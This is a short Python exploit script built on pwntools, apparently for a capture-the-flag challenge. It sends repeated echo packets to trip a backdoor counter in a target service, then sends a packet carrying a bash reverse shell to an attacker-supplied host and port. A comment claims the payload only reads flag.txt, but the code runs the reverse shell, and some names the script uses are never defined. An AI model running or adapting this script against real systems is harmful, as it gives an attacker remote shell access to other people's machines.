from pwn import *


def send_packet(packet_type, length, value):
    packet = p32(packet_type) + p32(length) + value
    return packet


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(":")[0]
        PORT = args.R.split(":")[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)


conn = run()

# Craft and send packets to trigger the backdoor function
# Type 0x4 echo packet to increment the backdoor_trigger
# echo_packet = send_packet(0x4, 4, p32(0xDEADBEEF))
# conn.send(echo_packet)

# # Send three more echo packets to increment backdoor_trigger to 3
for _ in range(3):
    echo_packet = send_packet(0x4, 4, p32(0xDEADBEEF))
    conn.send(echo_packet)

# # Craft and send a backdoor packet to execute "cat flag.txt"
LHOST = args.ATTACKER.split(":")[0]
LPORT = args.ATTACKER.split(":")[1]

cmd = args.CMD
cmd = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"

backdoor_packet = send_packet(0x4, len(cmd), cmd.encode())
conn.send(backdoor_packet)

conn.interactive()
